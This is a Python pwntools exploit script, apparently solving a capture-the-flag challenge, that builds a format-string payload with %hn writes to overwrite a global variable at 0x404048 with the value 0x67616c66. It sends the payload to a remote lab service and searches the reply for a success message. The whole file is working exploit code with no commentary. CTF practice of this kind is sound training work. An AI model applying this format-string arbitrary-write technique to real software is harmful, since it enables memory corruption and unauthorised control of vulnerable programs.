#!/usr/bin/env python3
from pwn import *

HOST = "xebec.cylabacademy.net"
PORT = 15795

context.log_level = "info"

target = 0x67616c66
sus = 0x404048

lower = target & 0xffff
upper = (target >> 16) & 0xffff

fmt = (
    f"%1${upper}c%18$hn"
    f"%1${lower - upper}c%19$hn"
).encode()

padding = b"A" * ((-len(fmt)) % 8)
payload = fmt + padding + p64(sus + 2) + p64(sus)


def main():
    io = remote(HOST, PORT)

    io.sendlineafter(
        b"What do you have to say?\n",
        payload
    )

    output = io.recvall(timeout=5)

    marker = b"I have NO clue how you did that"
    position = output.find(marker)

    if position != -1:
        print(output[position:].decode(errors="replace"), end="")
    else:
        print(output[-500:].decode(errors="replace"), end="")
        log.warning("Pesan keberhasilan tidak ditemukan.")

    io.close()


if __name__ == "__main__":
    main()
